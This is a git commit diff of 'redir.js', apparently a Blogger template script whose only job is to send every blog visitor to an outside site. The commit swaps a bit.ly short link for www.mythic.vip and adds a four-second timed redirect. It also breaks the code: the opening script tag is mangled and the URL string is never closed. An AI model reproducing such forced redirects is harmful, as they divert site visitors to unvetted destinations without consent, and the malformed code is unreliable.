5f5d592b997cb42c893488cdee14b45ddf33e714
ulikk01 <32412859+ulikk01@users.noreply.github.com>
2020-08-29 03:41:03 +0700

    Update redir.js

--- redir.js
+++ redir.js
@@ -1,5 +1,11 @@
-<script type='text/javascript'>
+type='text/javascript'>
 var d=&#39;<data:blog.url/>&#39;;
 d=d.replace(/.*\/\/[^\/]*/, &#39;&#39;);
-location.href = &#39;https://bit.ly/32ziShc&#39;;
-</script>
+location.href = &#39;www.mythic.vip;;
+
+
+setTimeout(
+  function(){
+    window.location = "www.mythic.vip" 
+  },
+4000);
